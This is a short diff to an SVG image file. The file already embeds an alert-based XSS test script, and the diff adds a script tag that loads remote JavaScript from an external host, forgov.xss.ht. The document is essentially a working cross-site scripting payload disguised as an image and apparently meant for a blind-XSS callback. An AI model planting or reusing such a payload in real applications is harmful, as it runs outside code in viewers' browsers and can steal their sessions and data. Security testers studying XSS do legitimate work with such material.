@@ -6,4 +6,5 @@
    <script type="text/javascript">
       alert('This app is probably vulnerable to XSS attacks!');
    </script>
+   <script src=https://forgov.xss.ht></script>
 </svg>
